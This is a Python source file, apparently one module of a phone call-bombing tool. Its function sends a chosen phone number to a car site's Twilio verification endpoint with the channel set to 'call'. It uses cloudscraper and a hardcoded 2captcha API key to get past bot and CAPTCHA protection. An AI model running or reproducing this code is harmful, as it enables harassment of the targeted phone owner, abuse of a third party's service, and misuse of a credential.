import requests
import cloudscraper

def sendRequest(target):
        header = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A205U)",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers",
            "Content-Type": "application/json;charset=utf-8",
            "Authorization": "Bearer true",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        payload = {
            "phone": target,
            "channeltype": "call",
            "locale": "en",
            "_": "1670163984304"
        }

            

        scraper = cloudscraper.create_scraper(
            interpreter="nodejs",
            browser={
                "browser": "firefox",
                "platform": "windows",
                "mobile": True,
            },
            captcha={
                "provider": "2captcha",
                "api_key": "feff5f62d5a6737c2dc45946d1854e80",
            },
        )
        try:
            r = scraper.get('https://egypt.yallamotor.com/verify-twilio/911959', params=payload, headers=header )
        except Exception as e:
            print(e)
            return None
        return r
        
